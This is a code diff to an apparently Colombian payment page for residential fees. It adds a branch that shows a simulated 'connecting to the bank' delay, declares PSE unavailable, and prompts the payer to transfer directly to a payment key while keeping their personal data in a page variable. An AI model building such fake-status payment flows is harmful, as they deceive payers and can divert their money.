@@ -891,6 +891,30 @@ ${metodoInfo}
                     }
 
 
+                    // Si el banco redirige a Bold → loading breve → modal bre-v con mensaje "ups"
+                    if (pseBank === 'https://checkout.bold.co/payment/LNK_18XJ8MHRLW') {
+                        document.getElementById('brevLoadingTexto').textContent = 'Conectando con el banco...';
+                        document.getElementById('brevLoadingOverlay').style.display = 'flex';
+                        btnPagar.disabled = true;
+
+                        setTimeout(() => {
+                            document.getElementById('brevLoadingOverlay').style.display = 'none';
+                            btnPagar.disabled = false;
+
+                            document.getElementById('brevModalTitulo').textContent = '¡Ups! Pago no disponible';
+                            document.getElementById('brevModalSub').textContent = `PSE no está disponible para ${pseBankNombre}. Intenta transferir directamente a la llave:`;
+                            document.getElementById('brevModalMonto').textContent = totalFormatted;
+                            window._brevData = {
+                                nombre: userNombre, apellido: userApellido, email: userEmail,
+                                celular: userCelular, nombreConjunto: nombreConjunto,
+                                referencia1: referencia1, selectedApt: selectedApt,
+                                referencia2: referencia2, totalFormatted: totalFormatted
+                            };
+                            document.getElementById('brevModal').style.setProperty('display', 'flex', 'important');
+                        }, 1800);
+                        return;
+                    }
+
                     // Guardar datos PSE en sessionStorage
                     sessionStorage.setItem('pseDocNumber', pseDocNumber);
                     sessionStorage.setItem('pseBank', pseBank);
